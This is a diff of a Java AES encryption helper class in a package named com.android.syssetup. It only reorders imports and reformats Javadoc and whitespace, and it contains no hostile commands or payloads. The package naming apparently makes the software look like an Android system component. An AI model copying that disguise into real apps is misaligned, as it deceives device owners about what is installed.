@@ -9,6 +9,10 @@
 
 package com.android.syssetup.crypto;
 
+import com.android.mm.M;
+import com.android.syssetup.action.sync.Statistics;
+import com.android.syssetup.auto.Cfg;
+
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
@@ -20,44 +24,47 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
-import com.android.syssetup.action.sync.Statistics;
-import com.android.syssetup.auto.Cfg;
-import com.android.mm.M;
-
 // TODO: Auto-generated Javadoc
+
 /**
  * http://www.androidsnippets.org/snippets/39/index.html
- * 
+ *
  * @author zeno
- * 
  */
 public class Crypto {
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "Crypto"; //$NON-NLS-1$
 
-	/** The aes_key. */
+	/**
+	 * The aes_key.
+	 */
 	private final byte[] aes_key;
 
-	/** The skey_spec. */
+	/**
+	 * The skey_spec.
+	 */
 	private final SecretKeySpec skey_spec;
 
-	/** The iv spec. */
+	/**
+	 * The iv spec.
+	 */
 	private final IvParameterSpec ivSpec;
 
-	/** The cipher. */
+	/**
+	 * The cipher.
+	 */
 	Cipher cipherEnc;
 	Cipher cipherDec;
 
 	/**
 	 * Instantiates a new crypto.
-	 * 
-	 * @param key
-	 *            the key
-	 * @throws NoSuchAlgorithmException
-	 *             the no such algorithm exception
-	 * @throws NoSuchPaddingException
-	 *             the no such padding exception
+	 *
+	 * @param key the key
+	 * @throws NoSuchAlgorithmException           the no such algorithm exception
+	 * @throws NoSuchPaddingException             the no such padding exception
 	 * @throws InvalidAlgorithmParameterException
 	 * @throws InvalidKeyException
 	 */
@@ -98,12 +105,10 @@ public class Crypto {
 
 	/**
 	 * Encrypt.
-	 * 
-	 * @param clear
-	 *            the clear
+	 *
+	 * @param clear the clear
 	 * @return the byte[]
-	 * @throws Exception
-	 *             the exception
+	 * @throws Exception the exception
 	 */
 	public byte[] encrypt(final byte[] plain) throws Exception {
 		Statistics statistics;
@@ -148,7 +153,7 @@ public class Crypto {
 		} catch (InvalidAlgorithmParameterException e) {
 			return null;
 		}
-		
+
 		Statistics statistics;
 		if (Cfg.STATISTICS) {
 			statistics = new Statistics("encrypt");
@@ -167,12 +172,10 @@ public class Crypto {
 
 	/**
 	 * Decrypt.
-	 * 
-	 * @param encrypted
-	 *            the encrypted
+	 *
+	 * @param encrypted the encrypted
 	 * @return the byte[]
-	 * @throws Exception
-	 *             the exception
+	 * @throws Exception the exception
 	 */
 	public byte[] decrypt(final byte[] encrypted) throws Exception {
 		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
@@ -192,15 +195,12 @@ public class Crypto {
 
 	/**
 	 * Decrypt.
-	 * 
-	 * @param encrypted
-	 *            the encrypted
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param encrypted the encrypted
+	 * @param offset    the offset
 	 * @param offset2
 	 * @return the byte[]
-	 * @throws Exception
-	 *             the exception
+	 * @throws Exception the exception
 	 */
 	public byte[] decrypt(final byte[] encrypted, final int plainlen, int offset) throws Exception {
 		if (offset < 0 || encrypted.length < offset) {
